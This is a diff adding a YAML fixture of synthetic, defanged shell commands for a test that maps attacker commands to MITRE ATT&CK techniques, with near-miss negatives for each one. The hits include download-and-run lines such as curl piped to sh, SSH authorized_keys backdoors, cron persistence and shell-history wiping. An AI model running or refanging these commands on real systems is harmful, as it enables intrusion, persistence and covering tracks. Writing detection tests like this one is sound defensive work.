@@ -1,0 +1,122 @@
+# Synthetische Befehle für tests/test_attack.py (Schritt 6.1).
+#
+# Von Hand geschrieben, nicht aus Mitschnitten oder Rohdaten übernommen.
+# Adressen nur aus den Dokumentationsnetzen (RFC 5737) und unter .test,
+# und zwar in der entschärften Form, in der Befehle gespeichert werden
+# (hxxp://, [.]). Schlüssel nur als Platzhalter.
+#
+# Je Technik:
+#   hits         muss genau diese eine Technik treffen
+#   near_misses  sieht ähnlich aus, darf aber gar nichts treffen
+# multi: Befehle mit mehreren Techniken und der vollständigen Erwartung.
+
+techniques:
+  T1082:
+    hits:
+      - 'uname -a'
+      - '/bin/uname -m'
+      - 'cat /proc/cpuinfo | grep name | wc -l'
+      - 'lscpu'
+      - 'cat /etc/os-release'
+      - 'echo "$(nproc)"'
+    near_misses:
+      - 'cat /tmp/uname.txt'
+      - 'unamex -a'
+      - 'echo uname'
+      - 'ls /proc'
+
+  T1033:
+    hits:
+      - 'whoami'
+      - 'echo $(id -u)'
+      - 'sudo who'
+      - 'id'
+    near_misses:
+      - 'cat ~/.ssh/id_rsa.pub'
+      - 'echo whoami'
+      - 'idle'
+      - 'ls -la /home/who'
+
+  T1098.004:
+    hits:
+      - 'echo "ssh-ed25519 AAAAPLATZHALTER beispiel" >> ~/.ssh/authorized_keys'
+      - 'echo "ssh-rsa AAAAPLATZHALTER" > /root/.ssh/authorized_keys'
+      - 'echo "ssh-ed25519 AAAAPLATZHALTER" | tee -a .ssh/authorized_keys'
+    near_misses:
+      - 'cat ~/.ssh/authorized_keys'
+      - 'grep ssh-rsa ~/.ssh/authorized_keys > /tmp/k'
+      - 'ls ~/.ssh/authorized_keys'
+
+  T1222.002:
+    hits:
+      - 'chattr -ia ~/.ssh/authorized_keys'
+      - 'chmod 700 .ssh'
+      - 'chmod -R go= /root/.ssh'
+      - 'chattr +i ".ssh"'
+    near_misses:
+      - 'chmod +x x.sh'
+      - 'ls -la ~/.ssh'
+      - 'chattr -i /tmp/x'
+      - 'chmod 600 id.sshkey'
+
+  T1105:
+    hits:
+      - 'wget hxxp://198[.]51[.]100[.]7/x.sh'
+      - 'cd /tmp && tftp -g -r x 192[.]0[.]2[.]4'
+      - 'curl -fsSL hxxps://beispiel[.]test/i.sh | sh'
+      - 'curl -o /tmp/x hxxp://203[.]0[.]113[.]9/x'
+      - 'curl -fsSLO hxxps://beispiel[.]test/x.tar.gz'
+      - 'busybox wget hxxp://beispiel[.]test/bins.sh'
+    near_misses:
+      - 'apt-get install -y wget curl'
+      - 'curl -s hxxps://beispiel[.]test/ip'
+      - 'which wget'
+      - 'curl --version'
+
+  T1057:
+    hits:
+      - 'ps aux'
+      - 'ps -ef | grep -v grep'
+      - 'pgrep -f miner'
+      - 'top -bn1'
+    near_misses:
+      - 'psql'
+      - 'cat ps.txt'
+      - 'echo top'
+      - 'topaz'
+
+  T1053.003:
+    hits:
+      - '(crontab -l; echo "* * * * * /tmp/x") | crontab -'
+      - 'echo "* * * * * root /tmp/x" >> /etc/crontab'
+      - 'crontab /tmp/c'
+      - 'echo "@reboot /tmp/x" > /var/spool/cron/crontabs/root'
+    near_misses:
+      - 'crontab -l'
+      - 'cat /etc/crontab'
+      - 'crontab -r'
+      - 'ls /etc/cron.d'
+
+  T1070.003:
+    hits:
+      - 'history -c'
+      - 'unset HISTFILE'
+      - 'export HISTFILE=/dev/null'
+      - 'HISTSIZE=0'
+      - 'cat /dev/null > ~/.bash_history'
+      - 'rm -rf ~/.bash_history'
+    near_misses:
+      - 'history'
+      - 'cat ~/.bash_history'
+      - 'echo $HISTFILE'
+      - 'echo x >> ~/.bash_history'
+
+multi:
+  - command: 'uname -a; whoami; wget hxxp://198[.]51[.]100[.]7/x.sh'
+    expect: [T1033, T1082, T1105]
+  - command: 'cd ~; chattr -ia .ssh; echo "ssh-ed25519 AAAAPLATZHALTER" >> .ssh/authorized_keys; chmod 600 .ssh/authorized_keys'
+    expect: [T1098.004, T1222.002]
+  - command: 'cd /tmp && curl -o x hxxp://203[.]0[.]113[.]9/x && (crontab -l; echo "@reboot /tmp/x") | crontab - && history -c'
+    expect: [T1053.003, T1070.003, T1105]
+  - command: 'cat /proc/cpuinfo | grep name | head -n 1; ps aux | grep -v grep; id'
+    expect: [T1033, T1057, T1082]
